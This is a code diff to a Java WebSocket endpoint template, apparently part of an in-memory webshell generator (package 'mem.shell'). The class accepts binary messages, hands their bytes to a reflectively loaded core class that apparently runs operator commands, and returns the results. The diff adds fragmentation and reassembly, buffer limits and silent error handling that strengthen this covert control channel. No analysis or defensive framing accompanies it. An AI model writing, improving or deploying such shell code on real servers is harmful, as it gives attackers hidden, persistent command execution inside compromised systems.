@@ -3,6 +3,12 @@ package org.leo.jmg.mem.shell.http;
 import java.lang.reflect.InvocationTargetException;
 
 public class LeoWebSocketTpl extends javax.websocket.Endpoint implements javax.websocket.MessageHandler.Whole<java.nio.ByteBuffer>{
+    private static final int MAX_MESSAGE_BYTES = 16 * 1024 * 1024;
+    private static final int MAX_FRAME_BYTES = 64 * 1024;
+    private static final int FRAME_HEADER_BYTES = 1 + 8 + 4 + 4 + 4;
+    private static final int MAX_FRAGMENT_PAYLOAD_BYTES = MAX_FRAME_BYTES - FRAME_HEADER_BYTES;
+    private static final byte TYPE_DATA = 1;
+
     private static String headerName;
     private static String headerValue;
 
@@ -11,6 +17,10 @@ public class LeoWebSocketTpl extends javax.websocket.Endpoint implements javax.w
     private static int respCode;
 
     private javax.websocket.Session session;
+    private final java.util.concurrent.ConcurrentHashMap<Long, Object[]> inboundMessages =
+            new java.util.concurrent.ConcurrentHashMap<Long, Object[]>();
+    private final java.util.concurrent.atomic.AtomicInteger bufferedInboundBytes =
+            new java.util.concurrent.atomic.AtomicInteger();
 
     static {
         try {
@@ -33,31 +43,127 @@ public class LeoWebSocketTpl extends javax.websocket.Endpoint implements javax.w
     public void onOpen(javax.websocket.Session session, javax.websocket.EndpointConfig endpointConfig) {
         this.session = session;
         session.addMessageHandler(this);
-        session.setMaxBinaryMessageBufferSize(64 * 1024);
+        session.setMaxBinaryMessageBufferSize(128 * 1024);
     }
 
     @Override
-    public void onMessage(java.nio.ByteBuffer buffer) {
+    public void onMessage(java.nio.ByteBuffer source) {
+        Long messageId = null;
         try {
-            long messageId = buffer.getLong();
+            if (source == null || source.remaining() < FRAME_HEADER_BYTES) {
+                throw new java.io.IOException("incomplete frame header");
+            }
+            java.nio.ByteBuffer buffer = source.slice();
+            byte frameType = buffer.get();
+            messageId = Long.valueOf(buffer.getLong());
+            int fragmentIndex = buffer.getInt();
+            int fragmentCount = buffer.getInt();
+            int totalLength = buffer.getInt();
+
+            if (frameType != TYPE_DATA || totalLength < 0 || totalLength > MAX_MESSAGE_BYTES) {
+                throw new java.io.IOException("invalid frame metadata");
+            }
+            int expectedCount = Math.max(1, (totalLength + MAX_FRAGMENT_PAYLOAD_BYTES - 1)
+                    / MAX_FRAGMENT_PAYLOAD_BYTES);
+            if (fragmentCount != expectedCount || fragmentIndex < 0 || fragmentIndex >= fragmentCount) {
+                throw new java.io.IOException("invalid fragment position");
+            }
+            int expectedPayloadLength = Math.min(MAX_FRAGMENT_PAYLOAD_BYTES,
+                    totalLength - fragmentIndex * MAX_FRAGMENT_PAYLOAD_BYTES);
+            if (buffer.remaining() != expectedPayloadLength) {
+                throw new java.io.IOException("invalid fragment length");
+            }
+
             byte[] payload = new byte[buffer.remaining()];
             buffer.get(payload);
-            java.io.ByteArrayOutputStream byteArrayOutputStream = new java.io.ByteArrayOutputStream();
-            byteArrayOutputStream.write(payload);
-            Class.forName(coreClassName,true,ClassLoader.getSystemClassLoader()).newInstance().equals(byteArrayOutputStream);
-            java.io.ByteArrayOutputStream responseStream = new java.io.ByteArrayOutputStream();
-            java.nio.ByteBuffer idBuffer = java.nio.ByteBuffer.allocate(Long.BYTES);
-            idBuffer.putLong(messageId);
-            responseStream.write(idBuffer.array());
-            responseStream.write(byteArrayOutputStream.toByteArray());
-            java.nio.ByteBuffer outBuffer = java.nio.ByteBuffer.wrap(responseStream.toByteArray());
-            session.getAsyncRemote().sendBinary(outBuffer);
-        } catch (Throwable t) {
-            try {
-                session.close();
-            } catch (java.io.IOException ignored) {}
+            Object[] state = inboundMessages.get(messageId);
+            if (state == null) {
+                if (fragmentIndex != 0) {
+                    throw new java.io.IOException("message does not start at fragment zero");
+                }
+                Object[] created = new Object[]{
+                        new java.io.ByteArrayOutputStream(totalLength),
+                        Integer.valueOf(0), Integer.valueOf(fragmentCount), Integer.valueOf(totalLength)
+                };
+                Object[] previous = inboundMessages.putIfAbsent(messageId, created);
+                state = previous == null ? created : previous;
+            }
+
+            byte[] request = null;
+            synchronized (state) {
+                int nextIndex = ((Integer) state[1]).intValue();
+                if (((Integer) state[2]).intValue() != fragmentCount
+                        || ((Integer) state[3]).intValue() != totalLength
+                        || nextIndex != fragmentIndex) {
+                    throw new java.io.IOException("fragment sequence mismatch");
+                }
+                java.io.ByteArrayOutputStream requestStream =
+                        (java.io.ByteArrayOutputStream) state[0];
+                int bufferedBytes = bufferedInboundBytes.addAndGet(payload.length);
+                if (bufferedBytes > MAX_MESSAGE_BYTES) {
+                    bufferedInboundBytes.addAndGet(-payload.length);
+                    throw new java.io.IOException("inbound buffer limit exceeded");
+                }
+                requestStream.write(payload);
+                state[1] = Integer.valueOf(nextIndex + 1);
+                if (nextIndex + 1 == fragmentCount) {
+                    if (requestStream.size() != totalLength) {
+                        throw new java.io.IOException("incomplete message");
+                    }
+                    request = requestStream.toByteArray();
+                }
+            }
+
+            if (request != null) {
+                inboundMessages.remove(messageId, state);
+                bufferedInboundBytes.addAndGet(-request.length);
+                java.io.ByteArrayOutputStream coreStream = new java.io.ByteArrayOutputStream();
+                coreStream.write(request);
+                Class.forName(coreClassName,true,ClassLoader.getSystemClassLoader()).newInstance().equals(coreStream);
+                byte[] response = coreStream.toByteArray();
+                if (response.length > MAX_MESSAGE_BYTES) {
+                    throw new java.io.IOException("response exceeds message limit");
+                }
+                sendResponse(messageId.longValue(), response);
+            }
+        } catch (Throwable ignored) {
+            if (messageId != null) {
+                Object[] removed = inboundMessages.remove(messageId);
+                if (removed != null) {
+                    synchronized (removed) {
+                        bufferedInboundBytes.addAndGet(-((java.io.ByteArrayOutputStream) removed[0]).size());
+                    }
+                }
+            }
         }
     }
+
+    @Override
+    public void onClose(javax.websocket.Session session, javax.websocket.CloseReason closeReason) {
+        inboundMessages.clear();
+        bufferedInboundBytes.set(0);
+    }
+
+    private void sendResponse(long messageId, byte[] response) throws java.io.IOException {
+        int fragmentCount = Math.max(1, (response.length + MAX_FRAGMENT_PAYLOAD_BYTES - 1)
+                / MAX_FRAGMENT_PAYLOAD_BYTES);
+        synchronized (session) {
+            for (int fragmentIndex = 0; fragmentIndex < fragmentCount; fragmentIndex++) {
+                int offset = fragmentIndex * MAX_FRAGMENT_PAYLOAD_BYTES;
+                int payloadLength = Math.min(MAX_FRAGMENT_PAYLOAD_BYTES, response.length - offset);
+                java.nio.ByteBuffer frame = java.nio.ByteBuffer.allocate(FRAME_HEADER_BYTES + payloadLength);
+                frame.put(TYPE_DATA);
+                frame.putLong(messageId);
+                frame.putInt(fragmentIndex);
+                frame.putInt(fragmentCount);
+                frame.putInt(response.length);
+                frame.put(response, offset, payloadLength);
+                frame.flip();
+                session.getBasicRemote().sendBinary(frame);
+            }
+        }
+    }
+
     static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
         Class<?> decoderClass;
         try {
